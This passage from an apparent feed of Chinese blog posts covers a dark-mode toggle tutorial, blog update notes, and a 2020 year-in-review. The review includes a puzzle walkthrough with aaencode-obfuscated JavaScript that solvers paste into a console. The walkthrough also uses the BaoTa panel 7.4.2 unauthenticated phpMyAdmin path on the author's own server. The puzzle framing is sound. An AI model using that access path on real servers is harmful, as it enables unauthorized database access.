class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse 